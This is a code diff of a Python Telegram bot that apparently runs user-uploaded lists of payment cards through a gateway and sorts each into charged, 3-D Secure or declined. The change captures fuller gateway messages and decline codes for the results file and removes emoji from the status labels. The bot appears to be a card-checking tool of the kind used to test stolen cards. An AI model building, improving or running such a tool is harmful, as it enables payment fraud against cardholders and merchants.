@@ -590,27 +590,39 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             response = result["response"]
             card = result["card"]
 
-            # Get the response message for display
-            error_msg = response.get("error", "") or response.get("message", "") or "Processing..."
-            full_response = error_msg
+            # Build full response with all error details
+            response_parts = []
+            if response.get("message"):
+                response_parts.append(response.get("message"))
+            if response.get("error"):
+                response_parts.append(response.get("error"))
+            if response.get("gateway_message"):
+                response_parts.append(f"Gateway: {response.get('gateway_message')}")
+            if response.get("decline_code"):
+                response_parts.append(f"Code: {response.get('decline_code')}")
+
+            full_response = " | ".join(response_parts) if response_parts else "Unknown"
+
+            # Truncate for progress display only
+            error_msg = full_response
             if len(error_msg) > 50:
                 error_msg = error_msg[:47] + "..."
             last_response = error_msg
 
-            # Store result with response
+            # Store result with full response for file
             result_line = f"{card} | {full_response}"
 
             if response.get("success"):
                 charged.append(result)
-                all_results.append(f"✅ CHARGED | {result_line}")
+                all_results.append(f"CHARGED | {result_line}")
                 await update.message.reply_text(format_result(result), parse_mode="Markdown")
             elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
                 three_ds.append(result)
-                all_results.append(f"🔐 3DS | {result_line}")
+                all_results.append(f"3DS | {result_line}")
                 await update.message.reply_text(format_result(result), parse_mode="Markdown")
             else:
                 declined.append(result)
-                all_results.append(f"❌ DECLINED | {result_line}")
+                all_results.append(f"DECLINED | {result_line}")
 
             # Update progress every 5 cards to reduce API calls
             if (i + 1) % 5 == 0 or i + 1 == len(cards):
@@ -712,9 +724,20 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 response = result["response"]
                 card = result["card"]
 
-                # Get the response message for display
-                error_msg = response.get("error", "") or response.get("message", "") or "Processing..."
-                full_response = error_msg
+                # Build full response with all error details
+                response_parts = []
+                if response.get("message"):
+                    response_parts.append(response.get("message"))
+                if response.get("error"):
+                    response_parts.append(response.get("error"))
+                if response.get("gateway_message"):
+                    response_parts.append(f"Gateway: {response.get('gateway_message')}")
+                if response.get("decline_code"):
+                    response_parts.append(f"Code: {response.get('decline_code')}")
+
+                full_response = " | ".join(response_parts) if response_parts else "Unknown"
+
+                error_msg = full_response
                 if len(error_msg) > 50:
                     error_msg = error_msg[:47] + "..."
                 last_response = error_msg
@@ -723,15 +746,15 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
                 if response.get("success"):
                     charged.append(result)
-                    all_results.append(f"✅ CHARGED | {result_line}")
+                    all_results.append(f"CHARGED | {result_line}")
                     await update.message.reply_text(format_result(result), parse_mode="Markdown")
                 elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
                     three_ds.append(result)
-                    all_results.append(f"🔐 3DS | {result_line}")
+                    all_results.append(f"3DS | {result_line}")
                     await update.message.reply_text(format_result(result), parse_mode="Markdown")
                 else:
                     declined.append(result)
-                    all_results.append(f"❌ DECLINED | {result_line}")
+                    all_results.append(f"DECLINED | {result_line}")
 
                 # Update progress every 5 cards
                 if (i + 1) % 5 == 0 or i + 1 == len(cards):
